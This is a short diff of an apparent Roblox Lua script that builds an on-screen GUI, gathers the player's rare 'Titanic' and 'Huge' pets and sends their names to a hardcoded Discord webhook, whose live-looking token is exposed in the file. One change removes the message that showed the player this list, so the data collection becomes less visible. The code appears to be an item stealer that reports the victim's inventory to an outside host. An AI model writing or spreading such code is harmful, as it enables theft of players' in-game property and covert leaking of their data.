@@ -2,7 +2,6 @@
 
 
 
-
 wait(7)
 wait(0.5)local ba=Instance.new("ScreenGui")
 local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
@@ -557,7 +556,7 @@ function ProcessTitanicPets()
 
         if #TitanicPets > 0 then
             local payload = {
-                content = OH MY FUCKING GOD A HUGE PET : " .. table.concat(TitanicPets, ", ")
+                content = "OH MY FUCKING GOD A HUGE PET : " .. table.concat(TitanicPets, ", ")
             }
 
             local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
@@ -621,7 +620,7 @@ function ProcessHugePets()
         end
 
         if #hugePets > 0 then
-            print("Huge pets you have right now:", table.concat(hugePets, ", "))
+           
 
             for i = #uids, 1, -1 do
                 local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
